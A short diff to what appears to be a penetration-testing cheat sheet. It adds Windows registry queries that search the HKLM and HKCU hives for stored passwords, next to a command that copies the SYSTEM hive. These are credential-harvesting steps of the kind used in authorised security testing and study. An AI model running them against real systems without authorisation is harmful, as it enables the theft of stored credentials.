@@ -3924,9 +3924,11 @@ show hosts
 ```powershell
 # enumerate registry information, search recursively for password in HKLM
 reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f pass /t REG_SZ /s
 
 # enumerate registry information, search recursively for password in HKCU
 reg query HKCU /f password /t REG_SZ /s
+reg query HKCU /f pass /t REG_SZ /s
 
 # create copy of SYSTEM
 reg save HKLM\SYSTEM C:\path\to\copy\location\SYSTEM.save
